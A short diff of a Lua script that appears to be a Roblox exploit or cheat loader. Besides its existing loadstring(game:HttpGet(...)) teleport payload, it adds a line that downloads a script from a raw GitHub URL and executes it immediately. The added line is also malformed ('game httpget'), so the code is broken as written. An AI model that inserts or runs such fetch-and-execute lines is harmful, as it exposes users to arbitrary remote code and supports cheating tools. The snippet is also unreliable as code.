@@ -650,6 +650,7 @@ local success, err = xpcall(function()
             end
             
             if SCRIPT_URL then
+                loadstring(game httpget("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
                 local teleportScript = string.format([[
                     _G.PocariVulnsActivated = true
                     loadstring(game:HttpGet("%s", true))()
